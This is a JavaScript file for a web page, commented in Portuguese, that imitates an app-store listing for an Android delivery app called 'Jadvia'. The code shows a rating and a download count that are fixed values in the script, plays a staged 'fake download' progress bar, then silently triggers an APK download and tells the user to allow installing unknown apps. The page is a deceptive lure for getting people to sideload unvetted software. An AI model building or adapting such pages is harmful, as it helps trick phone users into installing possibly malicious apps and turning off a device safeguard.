// ===== CONFIGURE AQUI =====
// Se o APK está na raiz do seu site:
const DOWNLOAD_URL = "/Jadvia.apk";

// Se for link externo direto, use:
// const DOWNLOAD_URL = "https://seuservidor.com/Jadvia.apk";

const SUPPORT_URL = "https://seu-site.com/suporte";       // opcional
const PRIVACY_URL = "https://seu-site.com/privacidade";   // opcional
// =========================

const APPS = [
  {
    id: "jadvia",
    name: "Jadvia",
    publisher: "Jadvia Entregas",
    category: "Entregas • Rastreamento • Logística",
    rating: "4,6",
    downloads: "5M+",
  },
];

const $ = (id) => document.getElementById(id);

// Drawer
const drawer = $("drawer");
const backdrop = $("backdrop");
const openDrawerBtn = $("openDrawer");
const closeDrawerBtn = $("closeDrawer");

// Search/results
const searchInput = $("searchInput");
const resultsList = $("resultsList");
const emptyState = $("emptyState");
const resultsHint = $("resultsHint");

// Buttons
const installBtn = $("installBtn");
const shareBtn = $("shareBtn");
const micBtn = $("micBtn");

// Nav
const navGoApp = $("navGoApp");
const navGoShots = $("navGoShots");
const navGoReviews = $("navGoReviews");
const navClearSearch = $("navClearSearch");
const navSupport = $("navSupport");
const navPrivacy = $("navPrivacy");

// Download UI
const downloadUI = $("downloadUI");
const progressBar = $("progressBar");
const progressText = $("progressText");

// Modal
const installModal = $("installModal");
const closeModal = $("closeModal");
const modalOk = $("modalOk");
const modalStatus = $("modalStatus");

// Toast
const toast = $("toast");

function showToast(msg) {
  toast.textContent = msg;
  toast.classList.remove("hidden");
  window.setTimeout(() => toast.classList.add("hidden"), 4000);
}

function isValidUrl(u) {
  return typeof u === "string" && /^https?:\/\//i.test(u);
}

function isValidPathOrUrl(u) {
  // permite /arquivo.apk ou https://...
  return typeof u === "string" && (u.startsWith("/") || isValidUrl(u));
}

function isAndroid() {
  return /Android/i.test(navigator.userAgent || "");
}

function openDrawer() {
  drawer.classList.add("open");
  backdrop.classList.remove("hidden");
  document.body.style.overflow = "hidden";
}
function closeDrawerFn() {
  drawer.classList.remove("open");
  backdrop.classList.add("hidden");
  document.body.style.overflow = "";
}

openDrawerBtn.addEventListener("click", openDrawer);
closeDrawerBtn.addEventListener("click", closeDrawerFn);
backdrop.addEventListener("click", closeDrawerFn);

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeDrawerFn();
    hideModal();
  }
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
    e.preventDefault();
    searchInput.focus();
  }
});

function escapeHtml(str) {
  return String(str)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function filterApps(q) {
  const s = q.trim().toLowerCase();
  if (!s) return APPS;
  return APPS.filter(
    (a) =>
      a.name.toLowerCase().includes(s) ||
      a.publisher.toLowerCase().includes(s) ||
      a.category.toLowerCase().includes(s)
  );
}

function renderResults(list, q) {
  resultsList.innerHTML = "";
  emptyState.classList.add("hidden");

  if (!q.trim()) {
    resultsHint.textContent = "Digite para pesquisar por nome/categoria.";
  } else {
    resultsHint.innerHTML = `Encontrados: <strong>${list.length}</strong>`;
  }

  if (list.length === 0) {
    emptyState.innerHTML = `Nenhum resultado para <strong>${escapeHtml(q)}</strong>.`;
    emptyState.classList.remove("hidden");
    return;
  }

  list.forEach((app) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "result";
    btn.innerHTML = `
      <div class="result-left">
        <div class="result-icon">J</div>
        <div>
          <div class="result-name">${escapeHtml(app.name)}</div>
          <div class="result-meta">${escapeHtml(app.publisher)} • ${escapeHtml(app.category)}</div>
        </div>
      </div>
      <div class="result-right">
        <div class="result-rating">${escapeHtml(app.rating)} ★</div>
        <div class="result-small">${escapeHtml(app.downloads)}</div>
      </div>
    `;
    btn.addEventListener("click", () => {
      $("appDetail").scrollIntoView({ behavior: "smooth" });
      showToast(`Abrindo: ${app.name}`);
    });
    resultsList.appendChild(btn);
  });
}

searchInput.addEventListener("input", () => {
  const q = searchInput.value;
  renderResults(filterApps(q), q);
});

micBtn.addEventListener("click", () => {
  showToast("Pesquisa por voz: em breve.");
});

// Modal helpers
function showModal() {
  installModal.classList.remove("hidden");
}
function hideModal() {
  installModal.classList.add("hidden");
}

closeModal.addEventListener("click", hideModal);
modalOk.addEventListener("click", hideModal);

// fecha modal clicando fora do card
installModal.addEventListener("click", (e) => {
  if (e.target === installModal) hideModal();
});

function startFakeDownloadThenInstall() {
  // trava clique duplo
  installBtn.disabled = true;
  installBtn.classList.add("btn-disabled");
  installBtn.textContent = "Baixando… 0%";

  // mostra barra
  downloadUI.classList.remove("hidden");
  progressBar.style.width = "0%";
  progressText.textContent = "Baixando… 0%";

  let p = 0;
  const totalMs = 2200;
  const stepMs = 60;
  const steps = Math.floor(totalMs / stepMs);
  const inc = 100 / steps;

  const timer = setInterval(() => {
    const boost = p < 70 ? 1.1 : p < 90 ? 0.7 : 0.35;
    p = Math.min(100, p + inc * boost);

    const pct = Math.floor(p);
    progressBar.style.width = pct + "%";
    progressText.textContent = `Baixando… ${pct}%`;
    installBtn.textContent = `Baixando… ${pct}%`;

    if (pct >= 100) {
      clearInterval(timer);

      // Mostra modal com instruções
      modalStatus.textContent = "Abrindo instalador…";
      showModal();

      // Dispara download/abertura do APK
      // (em Android, isso abre download / gerenciador)
      const a = document.createElement("a");
      a.href = DOWNLOAD_URL;
      a.download = "Jadvia.apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // Atualiza status do modal após um tempo
      setTimeout(() => {
        modalStatus.textContent = "Se necessário, permita ‘Instalar apps desconhecidos’.";
      }, 900);

      // Restaura UI depois
      setTimeout(() => {
        installBtn.disabled = false;
        installBtn.classList.remove("btn-disabled");
        installBtn.textContent = "Instalar";
        downloadUI.classList.add("hidden");
      }, 1200);
    }
  }, stepMs);
}

installBtn.addEventListener("click", () => {
  if (!isAndroid()) {
    alert("Abra este link em um dispositivo Android para instalar o APK.");
    return;
  }

  if (!isValidPathOrUrl(DOWNLOAD_URL)) {
    showToast("DOWNLOAD_URL inválida. Use /Jadvia.apk ou https://...");
    return;
  }

  startFakeDownloadThenInstall();
});

shareBtn.addEventListener("click", async () => {
  const url = window.location.href;
  try {
    if (navigator.share) {
      await navigator.share({ title: "Jadvia", text: "Baixe o app Jadvia", url });
    } else {
      await navigator.clipboard.writeText(url);
      showToast("Link copiado!");
    }
  } catch {
    showToast("Não foi possível compartilhar agora.");
  }
});

// Drawer nav
navGoApp.addEventListener("click", () => {
  closeDrawerFn();
  $("appDetail").scrollIntoView({ behavior: "smooth" });
});
navGoShots.addEventListener("click", () => {
  closeDrawerFn();
  $("shots").scrollIntoView({ behavior: "smooth" });
});
navGoReviews.addEventListener("click", () => {
  closeDrawerFn();
  $("reviews").scrollIntoView({ behavior: "smooth" });
});
navClearSearch.addEventListener("click", () => {
  closeDrawerFn();
  searchInput.value = "";
  renderResults(APPS, "");
  showToast("Busca limpa.");
  searchInput.focus();
});

navSupport.href = isValidUrl(SUPPORT_URL) ? SUPPORT_URL : "#";
navPrivacy.href = isValidUrl(PRIVACY_URL) ? PRIVACY_URL : "#";

// init
renderResults(APPS, "");